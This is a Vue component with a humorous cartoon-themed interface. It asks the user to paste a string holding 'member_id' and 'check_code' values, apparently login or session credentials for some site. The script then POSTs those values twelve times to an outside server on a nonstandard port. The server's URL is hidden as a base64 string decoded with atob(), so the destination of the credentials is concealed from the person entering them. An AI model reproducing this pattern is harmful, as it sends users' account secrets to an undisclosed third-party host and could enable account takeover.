<script setup>
import { ref, getCurrentInstance  } from 'vue'


defineProps({
  msg: String
})

const textarea = ref('')
const loading = ref(false)
const alertShow = ref([false, false, false, false, false, false, false, false, false, false, false, false])
const alertNum = ref(12)
const alertError = ref(false)
const { $axios } = getCurrentInstance().appContext.config.globalProperties

const clearInput = () => {
  textarea.value = ''
  alertShow.value = [false, false, false, false, false, false, false, false, false, false, false, false]
  alertError.value = false
}

const getStart = () => {
  if(textarea.value) {
    loading.value = true
    let query = new URLSearchParams(textarea.value)
    const member_id = query.get('member_id')
    const check_code = query.get('check_code')
    if (!(member_id && check_code)) {
      loading.value = false
      alertError.value = true
      return
    }
    for(let i = 0; i < alertNum.value; i++) {
      $axios({
        url: atob('aHR0cHM6Ly85ODEyMC54eXo6NjU3Ny8='),
        async: false,
        method: 'post', 
        data: {
          member_id, check_code
        },
        headers: {
          'Content-Type':'multipart/form-data'
        }
      }).then(res=>{
        loading.value = false
        alertShow.value[i] = true
      }).catch(error=>{
        loading.value = false
      })
    }
  } else {
    alertError.value = true
  }
}
</script>

<template>
  <h1>{{ msg }}</h1>

  <el-input
    v-model="textarea"
    :rows="3"
    type="textarea"
    placeholder="是男人就该默默地工作，嘿嘿"
    @focus="clearInput"
  />

  <el-button type="primary" style="margin: 20px" @click="getStart" :loading="loading">卡布达，启动超级变换形态！</el-button>

  <el-alert
    title="蜻蜓队长"
    type="error"
    description="我宣布本厂比赛无效！请输入正确的反卡布达作战口号！"
    show-icon
    v-show="alertError"
  />

  <el-alert
    title="蜘蛛侦探前来反抗：第一，绝对不意气用事"
    type="success"
    description=""
    show-icon center
    v-show="alertShow[0]"
  />
  
  <el-alert
    title="蟑螂恶霸前来反抗：第二，绝对不漏判任何一件坏事"
    type="success"
    description=""
    show-icon center 
    v-show="alertShow[1]"
  />

  <el-alert
    title="鲨鱼辣椒前来反抗：第三，绝对裁判的公正漂亮"
    type="success"
    description=""
    show-icon center
    v-show="alertShow[2]"
  />

  <el-alert
    title="蜻蜓队长前来助阵：这场争夺战，我来做裁判"
    type="info"
    description=""
    show-icon center
    v-show="alertShow[3]"
  />

  <el-alert
    title="金龟次郎前来助阵：是男人就该默默锯木头"
    type="warning"
    description=""
    show-icon center
    v-show="alertShow[4]"
  />

  <el-alert
    title="飞翔机器人前来助阵：可以帮卡布达飞上天"
    type="error"
    description=""
    show-icon center
    v-show="alertShow[5]"
  />
  <el-alert
    title="蝎子莱莱前来反抗：以回力刀作为武器，披风来防御"
    type="success"
    description=""
    show-icon center
    v-show="alertShow[6]"
  />
  <el-alert
    title="田德莉娜前来助阵：胆子很小，但是很爱美"
    type="info"
    description=""
    show-icon center
    v-show="alertShow[7]"
  />
  <el-alert
    title="车轮滚滚前来助阵：还没有鲨鱼辣椒跑得快"
    type="error"
    description=""
    show-icon center
    v-show="alertShow[8]"
  />
  <el-alert
    title="呱呱蛙前来助阵：从结论上来说……"
    type="warning"
    description=""
    show-icon center
    v-show="alertShow[9]"
  />
  <el-alert
    title="丸子龙前来助阵：可以变成一个轮子，武器是强力盾"
    type="error"
    description=""
    show-icon center
    v-show="alertShow[10]"
  />
  <el-alert
    title="警用机器人前来反抗：很容易被别人的谎言欺骗"
    type="success"
    description=""
    show-icon center
    v-show="alertShow[11]"
  />

</template>

<style scoped>
.el-alert {
  margin: 10px 0 0;
}
</style>
